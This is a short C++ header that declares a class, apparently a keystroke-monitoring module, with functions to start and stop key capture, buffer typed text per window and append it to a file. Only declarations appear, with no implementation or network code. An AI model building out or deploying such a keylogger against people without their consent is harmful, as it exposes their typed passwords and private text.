// MyKeyMonTrans.h: interface for the CMyKeyMTrans class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_MYKEYMONTRANS_H__B56715F4_723A_460F_BD0A_6A3F4AF94D1E__INCLUDED_)
#define AFX_MYKEYMONTRANS_H__B56715F4_723A_460F_BD0A_6A3F4AF94D1E__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#define WM_KEY_INSERT	WM_USER + 900



class CMyKeyMTrans 
{
public:
	CMyKeyMTrans();
	virtual ~CMyKeyMTrans();
	virtual BOOL StartWork(HWND hWnd);

	HANDLE hWaitMetux;

	void static WriteBufThread(LPVOID lPvoid);
	void static SaveKeyThread(LPVOID lPvoid);
	void static StartMyKey();
	void static StopMyKey();
	void static SaveBuffer(WCHAR* sText, HWND hWnd, BOOL IsCheckHwnd);
	void static InsertBuffer(WCHAR* sText, WORD nCmd);
	BOOL static MyAppendFile(LPCTSTR m_FileName, LPVOID pData, DWORD dLen);
};

#endif // !defined(AFX_MYKEYMONTRANS_H__B56715F4_723A_460F_BD0A_6A3F4AF94D1E__INCLUDED_)
